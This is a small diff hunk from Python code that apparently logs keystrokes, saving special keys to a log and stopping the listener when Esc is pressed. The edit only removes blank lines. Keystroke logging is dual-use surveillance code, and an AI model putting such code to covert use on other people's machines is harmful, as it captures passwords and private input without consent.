@@ -8,8 +8,6 @@ def on_press(key):
     except AttributeError:
         logs.save_logs(f'[{key}]')
 
-    
-
 def on_release(key):
     if key == keyboard.Key.esc:
         # Stop Listener
